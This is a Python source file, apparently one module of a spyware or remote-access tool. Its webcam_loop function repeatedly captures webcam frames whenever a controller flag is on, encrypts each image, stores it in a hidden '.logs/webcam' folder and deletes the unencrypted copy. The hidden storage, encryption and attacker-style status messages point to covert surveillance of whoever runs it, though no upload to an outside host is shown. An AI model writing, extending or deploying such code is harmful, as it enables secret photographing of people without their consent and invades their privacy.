import cv2
import os
import time
from core.encryptor import encrypt_data

def webcam_loop(active):
    """Capture encrypted webcam images periodically."""
    os.makedirs(".logs/webcam", exist_ok=True)
    cam = cv2.VideoCapture(0)

    if not cam.isOpened():
        print("[!] Webcam not accessible")
        return

    print("[*] Warming up webcam...")
    for _ in range(10):
        cam.read()
        time.sleep(0.1)

    try:
        while True:
            if active["value"]:
                for _ in range(5):
                    ret, frame = cam.read()
                    if ret and frame is not None and frame.any():
                        ts = time.strftime("%Y%m%d_%H%M%S")
                        path = f".logs/webcam/webcam_{ts}.jpg"
                        cv2.imwrite(path, frame)

                        with open(path, "rb") as f:
                            encrypted = encrypt_data(f.read())

                        with open(path + ".enc", "wb") as f:
                            f.write(encrypted)

                        os.remove(path)
                        print(f"[+] Captured and encrypted webcam image: {path}.enc")
                        break
                    else:
                        print("[!] Blank frame detected, retrying...")
                        time.sleep(1)
                time.sleep(10)
    finally:
        cam.release()
